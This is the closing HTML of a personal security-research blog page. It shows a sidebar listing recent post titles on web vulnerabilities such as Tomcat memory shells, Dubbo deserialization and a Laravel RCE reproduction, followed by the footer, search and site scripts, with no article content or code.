Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat内存马"/></a><div class="content"><a class="title" href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马">Tomcat内存马</a><time datetime="2021-12-06T07:51:42.000Z" title="Created 2021-12-06 15:51:42">2021-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/" title="Handlebars AST注入"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Handlebars AST注入"/></a><div class="content"><a class="title" href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/" title="Handlebars AST注入">Handlebars AST注入</a><time datetime="2021-09-25T08:34:23.000Z" title="Created 2021-09-25 16:34:23">2021-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="Dubbo反序列化漏洞研究"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Dubbo反序列化漏洞研究"/></a><div class="content"><a class="title" href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="Dubbo反序列化漏洞研究">Dubbo反序列化漏洞研究</a><time datetime="2021-06-30T05:12:31.000Z" title="Created 2021-06-30 13:12:31">2021-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/" title="Yii2最新反序列化POP链分析"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Yii2最新反序列化POP链分析"/></a><div class="content"><a class="title" href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/" title="Yii2最新反序列化POP链分析">Yii2最新反序列化POP链分析</a><time datetime="2021-06-03T15:09:56.000Z" title="Created 2021-06-03 23:09:56">2021-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/" title="Laravel Debug mode RCE复现"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Laravel Debug mode RCE复现"/></a><div class="content"><a class="title" href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/" title="Laravel Debug mode RCE复现">Laravel Debug mode RCE复现</a><time datetime="2021-05-28T06:15:46.000Z" title="Created 2021-05-28 14:15:46">2021-05-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
